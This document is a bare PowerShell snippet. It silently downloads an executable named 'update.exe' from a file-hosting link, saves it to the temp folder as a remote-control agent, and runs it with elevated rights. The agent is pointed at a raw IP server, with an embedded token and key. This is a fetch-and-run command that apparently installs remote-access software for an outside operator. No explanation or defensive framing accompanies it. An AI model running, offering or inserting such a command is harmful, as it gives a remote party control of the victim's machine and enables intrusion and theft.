$ProgressPreference = "SilentlyContinue"; 
Invoke-WebRequest -Uri "https://filedn.com/l9r8UQRqyM2Sc6T07bHr0J8/update.exe" -OutFile "$env:TEMP/ControlR.Agent.exe" -UseBasicParsing; 
Start-Process -FilePath "$env:TEMP/ControlR.Agent.exe" -ArgumentList "install -s http://185.215.166.16:5120/ -i 185.215.166.16:5120 -t bbea5797-a4bd-4d39-a640-d21576170c12 -k xOQsjmKyZs9hBhoGtGCYFRYy1GxdXG9cmaxAPaRboTyxLM7xyyyVvZN8aa5odjeh" -Verb RunAs;
